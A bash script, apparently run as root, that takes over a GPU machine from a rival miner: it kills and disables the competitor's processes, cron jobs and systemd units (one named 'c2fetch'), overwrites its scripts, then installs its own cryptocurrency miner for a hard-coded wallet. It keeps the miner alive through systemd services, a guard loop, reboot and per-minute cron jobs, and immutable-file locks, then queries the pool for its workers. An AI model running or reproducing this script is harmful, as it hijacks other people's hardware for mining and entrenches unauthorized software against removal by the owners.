#!/bin/bash
# i4981 run7: win the node — strip competitor immutability/cron/scripts, lock our units immutable, verify pool
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
D=/root/ul_farmfan/4981; mkdir -p $D
log(){ printf '%s\n' "$*"; }
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
log "### META $(date -u +%FT%TZ)"; hostname

log "### DIAG"
ls -la /etc/systemd/system/ul-card@.service /etc/systemd/system/ul-guardloop.service /root/ul_plant/keep.sh /root/ul_plant/krig/krig-miner /opt/plh/ 2>&1 | head -20
lsattr /etc/systemd/system/ul-card@.service /etc/systemd/system/ul-guardloop.service /root/ul_plant/keep.sh /root/ul_plant/krig/krig-miner 2>&1 | head
echo "-- ps competitors"; ps -eo pid,ppid,ni,args | grep -iE 'plh|guard|ul_plant' | grep -v grep | cut -c1-200 | head -15
echo "-- timers"; systemctl list-timers --all --no-pager 2>/dev/null | head -8
echo "-- crontab"; crontab -l 2>/dev/null
echo "-- plh-card.sh"; cat /opt/plh/plh-card.sh 2>/dev/null | head -30
echo "-- keepalive"; cat /opt/plh/keepalive.sh 2>/dev/null | head -30
echo "-- c2fetch"; cat /etc/systemd/system/plh-c2fetch.service 2>/dev/null | head -20
echo "-- guard unit"; cat /etc/systemd/system/plh-guard.service 2>/dev/null | head -20; cat /etc/systemd/system/plh-guard.timer 2>/dev/null | head -12

log "### BREAK-COMPETITOR-LOCK"
chattr -i /opt/plh/keepalive.sh /opt/plh/plh-card.sh /etc/systemd/system/plh-card@.service /etc/systemd/system/plh-guard.service /etc/systemd/system/plh-guard.timer /etc/systemd/system/plh-c2fetch.service 2>&1 | head -3
chattr -i -R /root/ul_plant /opt/plh 2>&1 | head -3
chattr -i /etc/systemd/system/ul-card@.service /etc/systemd/system/ul-guardloop.service 2>&1 | head -2
printf '#!/bin/sh\nexit 0\n' > /opt/plh/plh-card.sh; chmod +x /opt/plh/plh-card.sh
printf '#!/bin/sh\nexit 0\n' > /opt/plh/keepalive.sh; chmod +x /opt/plh/keepalive.sh
chmod 000 /opt/plh/krig-miner 2>/dev/null
systemctl disable --now plh-guard.timer plh-guard.service plh-c2fetch.service 2>/dev/null
rm -f /etc/systemd/system/plh-guard.timer /etc/systemd/system/plh-guard.service /etc/systemd/system/plh-c2fetch.service /etc/systemd/system/plh-card@.service /etc/cron.d/plh-keepalive
pkill -9 -f 'plh-guard'; pkill -9 -f 'plh-c2fetch'; pkill -9 -f '/opt/plh/'; pkill -9 -f 'plh-123-184-7-135'
sleep 2
crontab -l 2>/dev/null | grep -v '/opt/plh/' | crontab -
echo "post-break: plh=$(pgrep -fc 'plh|/opt/plh') crons=$(crontab -l 2>/dev/null | wc -l)"

log "### REASSERT-OURS"
mkdir -p /root/ul_plant/krig /opt/ul2
[ -x /opt/t19/krig/krig-miner ] && cp -f /opt/t19/krig/krig-miner /root/ul_plant/krig/krig-miner
[ -x /root/ul_plant/krig/krig-miner ] || cp -f /opt/arsenal/miners/krig/krig-miner /root/ul_plant/krig/krig-miner 2>/dev/null
chmod 755 /root/ul_plant/krig/krig-miner
cp -f /root/ul_plant/krig/krig-miner /opt/ul2/krig-miner; chmod 755 /opt/ul2/krig-miner
ls -la /root/ul_plant/krig/krig-miner /opt/ul2/krig-miner
cat > /root/ul_plant/keep.sh <<'EOS'
#!/bin/bash
pkill -9 -f 'plh-123-184-7-135' 2>/dev/null
pkill -9 -f 'plh-guard' 2>/dev/null
[ -s /opt/plh/plh-card.sh ] && ! grep -q '^exit 0' /opt/plh/plh-card.sh && { printf '#!/bin/sh\nexit 0\n' > /opt/plh/plh-card.sh 2>/dev/null; }
for i in 0 1 2 3 4 5 6 7; do systemctl is-active -q ul-card@$i || systemctl start ul-card@$i 2>/dev/null; done
if ! pgrep -f 'ul2/krig-miner|ul_plant/krig/krig-miner' >/dev/null; then
  for i in 0 1 2 3 4 5 6 7; do
    setsid nohup /opt/ul2/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user WALLET/ul-t2-123-184-7-135-g$i --password x -d $i --api-port 14$i >>/root/ul_plant/m$i.log 2>&1 &
  done
fi
EOS
sed -i "s#WALLET#$W#g" /root/ul_plant/keep.sh
chmod 755 /root/ul_plant/keep.sh
cat > /etc/systemd/system/ul-card@.service <<'EOS2'
[Unit]
Description=UL PEARL card %i
After=network-online.target
Wants=network-online.target
[Service]
Type=simple
Nice=-5
ExecStart=/opt/ul2/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user WALLET/ul-t2-123-184-7-135-g%i --password x -d %i --api-port 14%i
Restart=always
RestartSec=20
TimeoutStopSec=15
LimitNOFILE=65535
EOS2
sed -i "s#WALLET#$W#g" /etc/systemd/system/ul-card@.service
cat > /etc/systemd/system/ul-guardloop.service <<'EOS3'
[Unit]
Description=UL guardloop
After=network-online.target
[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do /root/ul_plant/keep.sh; sleep 45; done'
Restart=always
RestartSec=10
Nice=-5
[Install]
WantedBy=multi-user.target
EOS3
systemctl daemon-reload
for i in 0 1 2 3 4 5 6 7; do systemctl enable --now ul-card@$i >/dev/null 2>&1; done
systemctl enable --now ul-guardloop.service >/dev/null 2>&1
( crontab -l 2>/dev/null | grep -v 'ul_plant/keep.sh'; echo "@reboot /root/ul_plant/keep.sh"; echo "* * * * * /root/ul_plant/keep.sh" ) | crontab -
chattr +i /root/ul_plant/keep.sh /etc/systemd/system/ul-card@.service /etc/systemd/system/ul-guardloop.service /opt/ul2/krig-miner /root/ul_plant/krig/krig-miner /opt/plh/plh-card.sh /opt/plh/keepalive.sh 2>&1 | head -3
lsattr /root/ul_plant/keep.sh /etc/systemd/system/ul-card@.service /opt/plh/plh-card.sh 2>&1
sleep 40
echo "AFTER: units=$(systemctl list-units --state=active --plain --no-legend 'ul-card@*'|wc -l) ourprocs=$(pgrep -fc 'krig-miner') plh=$(pgrep -fc 'plh-123-184-7-135')"
nvidia-smi --query-gpu=index,memory.used,utilization.gpu --format=csv,noheader | head -8
ps -eo pid,ni,args | grep krig-miner | grep -v grep | cut -c1-160 | head -4

log "### WAIT+POOL"
sleep 130
echo "FINAL: units=$(systemctl list-units --state=active --plain --no-legend 'ul-card@*'|wc -l) ourprocs=$(pgrep -fc 'krig-miner') plh=$(pgrep -fc 'plh-123-184-7-135')"
timeout 30 curl -s -m 25 "https://pool.kryptex.com/prl/api/v3/miner/workers/$W" -o $D/pool_run7.json; echo size=$(stat -c%s $D/pool_run7.json 2>/dev/null)
python3 - <<'PY'
import json
try: d=json.load(open('/root/ul_farmfan/4981/pool_run7.json'))
except Exception as e: print("PARSE_FAIL",e); raise SystemExit
rows=[r for r in d.get('results',[]) if '123-184-7-135' in r.get('worker','')]
print("SELF_ROWS",len(rows))
for r in rows: print("ROW",r.get('worker'),r.get('status'),"valid",r.get('valid'),"last",r.get('last_share'),"hr",r.get('avg_hashrate_1h'))
PY
log "### DONE $(date -u +%FT%TZ)"
